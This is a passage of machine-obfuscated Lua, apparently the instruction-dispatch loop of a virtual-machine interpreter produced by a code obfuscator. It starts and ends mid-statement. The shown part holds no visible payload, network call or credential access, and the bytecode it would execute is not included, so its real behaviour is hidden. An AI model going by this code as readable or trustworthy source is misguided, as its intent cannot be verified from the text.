w[y[94]]=w[y[63]][w[y[758]]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if 17>ba then n=n+1;else y=f[n];end else if ba~=19 then w[y[94]]=h[y[63]];else n=n+1;end end else if ba<=21 then if 21>ba then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if 23>ba then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if ba==24 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if ba>26 then bd=y[63];else y=f[n];end end else if ba<=29 then if ba==28 then bc=y[758];else bb=k(w,g,bd,bc);end else if 31~=ba then w[y[94]]=bb;else break end end end end end ba=ba+1 end elseif(29<z)then w[y[94]]=b(d[y[63]],nil,j);else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[94]]=w[y[63]];else bb=nil end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5>ba then w[y[94]]=y[63];else n=n+1;end else if ba<7 then y=f[n];else w[y[94]]=y[63];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if 11>ba then w[y[94]]=y[63];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[94]end else if 14==ba then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end ba=ba+1 end end;elseif(z<=31)then local ba=y[94]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif not(z==33)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[94]]=w[y[63]][w[y[758]]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[94]]=w[y[63]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[94]]=y[63];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba<10 then y=f[n];else w[y[94]]=y[63];end else if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[94]]=y[63];end end end else if ba<=15 then if 14==ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[94]else if 17==ba then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end end ba=ba+1 end else local ba=y[94];local bb=w[ba];for bc=(ba+1),y[63]do t(bb,w[bc])end;end;elseif z<=39 then if(36>z or 36==z)then if 34>=z then if(w[y[94]]<w[y[758]])then n=(n+1);else n=y[63];end;elseif(z>35)then local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba<2 then bc=nil else w[y[94]]={};end end else if ba<=3 then n=n+1;else if ba~=5 then y=f[n];else w[y[94]]=h[y[63]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7<ba then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end else if ba<=9 then n=n+1;else if 10<ba then w[y[94]]=h[y[63]];else y=f[n];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba>13 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end else if ba<=15 then n=n+1;else if 17>ba then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end else if ba<=20 then if ba<=18 then n=n+1;else if 20>ba then y=f[n];else w[y[94]]={};end end else if ba<=22 then if ba~=22 then n=n+1;else y=f[n];end else if 24>ba then w[y[94]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if ba==26 then w[y[94]]=h[y[63]];else n=n+1;end end else if ba<=28 then y=f[n];else if ba>29 then n=n+1;else w[y[94]][y[63]]=w[y[758]];end end end else if ba<=33 then if ba<=31 then y=f[n];else if 33~=ba then w[y[94]]=h[y[63]];else n=n+1;end end else if ba<=35 then if ba==34 then y=f[n];else w[y[94]][y[63]]=w[y[758]];end else if 37~=ba then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[94]][y[63]]=w[y[758]];else if 40~=ba then n=n+1;else y=f[n];end end else if ba<=41 then w[y[94]]={r({},1,y[63])};else if ba~=43 then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[94]]=w[y[63]];else if 46~=ba then n=n+1;else y=f[n];end end else if ba<=48 then if ba==47 then bc=y[94];else bb=w[bc];end else if ba<50 then for bd=bc+1,y[63]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[94]]=w[y[63]][y[758]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[94]]=h[y[63]];else n=n+1;end else if ba<=6 then y=f[n];else if 8>ba then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[94]]=y[63];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[94]]=y[63];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[94]else if 18>ba then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end end ba=ba+1 end end;elseif(37==z or 37>z)then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if ba<3 then y=f[n];else w[y[94]][y[63]]=w[y[758]];end end else if ba<=5 then if ba>4 then y=f[n];else n=n+1;end else if 6==ba then w[y[94]]=h[y[63]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba==8 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba==12 then w[y[94]][y[63]]=w[y[758]];else n=n+1;end else if ba<=14 then y=f[n];else if 15==ba then do return w[y[94]]end else break end end end end end ba=ba+1 end elseif not(z==39)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[94]]=j[y[63]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[94]]=y[63];else n=n+1;end else if ba>6 then w[y[94]]=w[y[63]][w[y[758]]];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 10==ba then w[y[94]]=w[y[63]];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[94]end else if ba>14 then break else w[bb]=w[bb](w[bb+1])end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba~=4 then n=n+1;else y=f[n];end end end else if ba<=7 then if ba<=5 then w[y[94]]=h[y[63]];else if ba<7 then n=n+1;else y=f[n];end end else if ba<=8 then w[y[94]]=w[y[63]][y[758]];else if 9<ba then y=f[n];else n=n+1;end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[94]]=h[y[63]];else if ba==12 then n=n+1;else y=f[n];end end else if ba<=14 then w[y[94]]=h[y[63]];else if ba<16 then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[94]]=w[y[63]][w[y[758]]];else if ba==18 then n=n+1;else y=f[n];end end else if ba<=20 then bb=y[94]else if 21==ba then w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif(z<42 or z==42)then if(40==z or 40>z)then local ba=y[94];do return r(w,ba,p)end;elseif 41<z then w[y[94]]=w[y[63]]*y[758];else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[94]]=w[y[63]][y[758]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[94]]=h[y[63]];else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[94]]=y[63];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[94]]=y[63];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[94]else if 17==ba then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end end ba=ba+1 end end;elseif(z<43 or z==43)then if(y[94]<w[y[758]])then n=n+1;else n=y[63];end;elseif 44<z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[94]]=h[y[63]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[94]]=h[y[63]];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then bd=y[94]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[758]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else w[y[94]]=w[y[63]]-w[y[758]];end;elseif 68>=z then if 56>=z then if 50>=z then if 47>=z then if z>46 then local ba;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](w[ba+1])else local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))end;elseif z<=48 then w[y[94]]=h[y[63]];elseif z>49 then local ba;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))else local ba;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=false;n=n+1;y=f[n];ba=y[94]w[ba](w[ba+1])end;elseif 53>=z then if 51>=z then w[y[94]]=false;n=n+1;elseif z~=53 then w[y[94]]={};else local ba;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))end;elseif z<=54 then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;elseif 55<z then w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;else local ba;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))end;elseif 62>=z then if 59>=z then if(57>z or 57==z)then local ba,bb=0 while true do if(ba<=8)then if ba<=3 then if(ba==1 or ba<1)then if 1~=ba then bb=nil else w[y[94]]=w[y[63]][y[758]];end else if ba==2 then n=(n+1);else y=f[n];end end else if(ba==5 or ba<5)then if(ba<5)then w[y[94]]=w[y[63]][y[758]];else n=(n+1);end else if(ba<=6)then y=f[n];else if ba>7 then n=(n+1);else w[y[94]]=w[y[63]][y[758]];end end end end else if(ba<=13)then if(ba<10 or ba==10)then if ba==9 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if(ba<11 or ba==11)then n=(n+1);else if 12<ba then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end end else if(ba<=15)then if(15>ba)then n=(n+1);else y=f[n];end else if(ba<=16)then bb=y[94]else if ba>17 then break else w[bb]=w[bb](w[(bb+1)])end end end end end ba=ba+1 end elseif(59>z)then local ba=y[94];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=(bb+bd);w[ba]=bb;if((bd>0)and bb<=bc)or bd<0 and bb>=bc then n=y[63];w[ba+3]=bb;end;else local ba,bb,bc,bd,be=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1<ba then be=nil else bc,bd=nil end end else if ba<=3 then w[y[94]]=j[y[63]];else if 5~=ba then n=n+1;else y=f[n];end end end else if ba<=8 then if ba<=6 then w[y[94]]=w[y[63]];else if ba<8 then n=n+1;else y=f[n];end end else if ba<=9 then w[y[94]]=y[63];else if 11~=ba then n=n+1;else y=f[n];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then w[y[94]]=y[63];else if ba>13 then y=f[n];else n=n+1;end end else if ba<=15 then w[y[94]]=y[63];else if 17~=ba then n=n+1;else y=f[n];end end end else if ba<=20 then if ba<=18 then be=y[94]else if ba~=20 then bc,bd=i(w[be](r(w,be+1,y[63])))else p=bd+be-1 end end else if ba<=21 then bb=0;else if ba>22 then break else for bd=be,p do bb=bb+1;w[bd]=bc[bb];end;end end end end end ba=ba+1 end end;elseif 60>=z then if(w[y[94]]<=w[y[758]])then n=(n+1);else n=y[63];end;elseif 62~=z then local ba=y[94]w[ba](r(w,ba+1,p))else w[y[94]]=w[y[63]]/y[758];end;elseif z<=65 then if z<=63 then local ba;local bb;local bc;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];bc=y[94]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[758]do ba=ba+1;w[bd]=bb[ba];end elseif z==64 then local ba=y[94]w[ba](r(w,ba+1,y[63]))else local ba;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))end;elseif 66>=z then local ba,bb=0 while true do if(ba<7 or ba==7)then if(ba<3 or ba==3)then if(ba<=1)then if not(ba==1)then bb=nil else w[y[94]]=h[y[63]];end else if not(3==ba)then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[94]]=y[63];else n=(n+1);end else if 6<ba then w[y[94]]=y[63];else y=f[n];end end end else if(ba==11 or ba<11)then if(ba<=9)then if(8<ba)then y=f[n];else n=(n+1);end else if(ba<11)then w[y[94]]=y[63];else n=n+1;end end else if(ba==13 or ba<13)then if 13>ba then y=f[n];else bb=y[94]end else if(ba<15)then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end ba=(ba+1)end elseif 68>z then local ba=y[63];local bb=y[758];local ba=k(w,g,ba,bb);w[y[94]]=ba;else w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;end;elseif z<=80 then if 74>=z then if z<=71 then if 69>=z then if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;elseif z<71 then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;else local ba=y[94]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[758]do bc=bc+1;w[bd]=bb[bc];end end;elseif z<=72 then local ba=y[94]local bb,bc=i(w[ba](r(w,ba+1,y[63])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif 74>z then local ba=y[94];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;else local ba;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))end;elseif 77>=z then if z<=75 then local ba;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]]*y[758];n=n+1;y=f[n];w[y[94]]=w[y[63]]+w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]]+w[y[758]];n=n+1;y=f[n];ba=y[94]w[ba]=w[ba](r(w,ba+1,y[63]))elseif 77~=z then local ba;local bb;local bc;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];bc=y[63];bb=y[758];ba=k(w,g,bc,bb);w[y[94]]=ba;else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;end;elseif 78>=z then local ba=y[94];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;elseif z<80 then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end else w[y[94]]=w[y[63]]-y[758];end;elseif 86>=z then if z<=83 then if 81>=z then local q=y[94]w[q]=w[q](r(w,q+1,p))elseif 83>z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()else local q;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif 84>=z then do return w[y[94]]end elseif 86~=z then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end else w[y[94]]=w[y[63]][y[758]];end;elseif 89>=z then if z<=87 then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif z~=89 then w[y[94]]=true;else local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif 90>=z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()elseif z==91 then local q;local x;local ba;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[63];x=y[758];q=k(w,g,ba,x);w[y[94]]=q;else local q;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif z<=138 then if 115>=z then if 103>=z then if 97>=z then if z<=94 then if z==93 then local q;w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=y[758];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q=y[94]w[q]=w[q](w[q+1])end;elseif 95>=z then local q=w[y[758]];if not q then n=n+1;else w[y[94]]=q;n=y[63];end;elseif z~=97 then w[y[94]]=h[y[63]];else w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;end;elseif z<=100 then if z<=98 then local q=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0<q then n=n+1;else w[y[94]][y[63]]=y[758];end else if q<=2 then y=f[n];else if q~=4 then w[y[94]]={};else n=n+1;end end end else if q<=6 then if 6~=q then y=f[n];else w[y[94]][y[63]]=w[y[758]];end else if q<=7 then n=n+1;else if q~=9 then y=f[n];else w[y[94]]=h[y[63]];end end end end else if q<=14 then if q<=11 then if q==10 then n=n+1;else y=f[n];end else if q<=12 then w[y[94]]=w[y[63]][y[758]];else if 14>q then n=n+1;else y=f[n];end end end else if q<=16 then if 16>q then w[y[94]][y[63]]=w[y[758]];else n=n+1;end else if q<=17 then y=f[n];else if 18<q then break else w[y[94]][y[63]]=w[y[758]];end end end end end q=q+1 end elseif z<100 then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else w[y[94]][y[63]]=y[758];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];end;elseif 101>=z then local q,x=0 while true do if q<=12 then if q<=5 then if q<=2 then if q<=0 then x=nil else if q==1 then w={};else for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end end else if q<=3 then n=n+1;else if q<5 then y=f[n];else w[y[94]]=h[y[63]];end end end else if q<=8 then if q<=6 then n=n+1;else if 8>q then y=f[n];else w[y[94]]=j[y[63]];end end else if q<=10 then if 10>q then n=n+1;else y=f[n];end else if q<12 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if q<=18 then if q<=15 then if q<=13 then y=f[n];else if 14==q then w[y[94]]=y[63];else n=n+1;end end else if q<=16 then y=f[n];else if q~=18 then w[y[94]]=y[63];else n=n+1;end end end else if q<=21 then if q<=19 then y=f[n];else if q<21 then w[y[94]]=y[63];else n=n+1;end end else if q<=23 then if 22<q then x=y[94]else y=f[n];end else if q==24 then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=q+1 end elseif 103>z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;else local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif z<=109 then if(z<=106)then if(104>z or 104==z)then local q,x=0 while true do if q<=10 then if q<=4 then if q<=1 then if 1~=q then x=nil else w[y[94]]=h[y[63]];end else if q<=2 then n=n+1;else if 3==q then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end else if q<=7 then if q<=5 then n=n+1;else if 6<q then w[y[94]]=h[y[63]];else y=f[n];end end else if q<=8 then n=n+1;else if 10>q then y=f[n];else w[y[94]]=w[y[63]][w[y[758]]];end end end end else if q<=15 then if q<=12 then if 12>q then n=n+1;else y=f[n];end else if q<=13 then w[y[94]]=h[y[63]];else if 15~=q then n=n+1;else y=f[n];end end end else if q<=18 then if q<=16 then w[y[94]]=w[y[63]][y[758]];else if 18~=q then n=n+1;else y=f[n];end end else if q<=19 then x=y[94]else if 21~=q then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=q+1 end elseif z<106 then w[y[94]]=y[63]*w[y[758]];else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0==q then x=nil else ba=nil end else if q<=2 then bb=nil else if q<4 then w[y[94]]=h[y[63]];else n=n+1;end end end else if q<=6 then if q~=6 then y=f[n];else w[y[94]]=h[y[63]];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<=12 then 